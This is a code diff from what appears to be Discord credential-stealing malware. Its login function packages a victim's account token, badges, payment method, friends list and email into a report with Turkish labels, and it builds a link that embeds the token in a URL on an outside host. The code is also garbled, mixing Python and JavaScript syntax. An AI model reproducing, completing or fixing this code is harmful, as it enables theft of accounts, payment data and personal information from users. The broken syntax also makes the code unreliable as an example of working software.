@@ -610,28 +610,28 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-                        "name": f'<:cilgin:991704799160582204> Token:',
+                        "name": '<:cilgin:991704799160582204> Token:',
                         "value": `\`{token}\` [Kopyalamak için tıkla!](https://superfurrycdn.nl/copy/{token})`,
                         "inline": False
                     },
                     {
                         "name": '<:saygi:991705923443761263> Rozetler:',
-                        "value": f`\`{get_badges(token)}`,
+                        "value": `\`{get_badges(token)}`,
                         "inline": True
                     },
                     {
                         "name": '<:ihihi:991704618524475503> Ödeme yöntemi:',
-                        "value": f`\`{card}\``,
+                        "value": `\`{card}\``,
                         "inline": True
                     },
                     {
                         "name": '<:iyidegilim:993461526063235092> Arkadaşlar:',
-                        "value": f`\`{get_friends(token)}\``,
+                        "value": `\`{get_friends(token)}\``,
                         "inline": True
                     },
                     {
                         name: '<:ne_baktin_guzelim:991704353704513617> E-posta:',
-                        value: f`\`{email}\``,
+                        value: `\`{email}\``,
                         inline: True
                     },
                    
